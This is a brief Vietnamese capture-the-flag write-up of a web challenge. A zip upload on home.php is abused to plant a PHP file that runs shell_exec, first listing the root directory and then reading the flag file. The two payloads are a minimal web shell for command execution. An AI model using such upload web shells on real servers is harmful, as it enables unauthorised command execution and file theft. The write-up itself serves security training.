![image](../img/4.1.png)

start chall cho ta thấy danh sách file
![image](../img/4.2.png)

tại home.php chỉ cho phép upload file zip
upload 1 file zip có chứa file php nội dung như sau
```
<?
    echo shell_exec('ls /');
?>
```
![image](../img/4.3.png)

payload đọc flag

```
<?
    echo shell_exec('cat /flagXNY8H.txt');
?>
```

![image](../img/4.4.png)

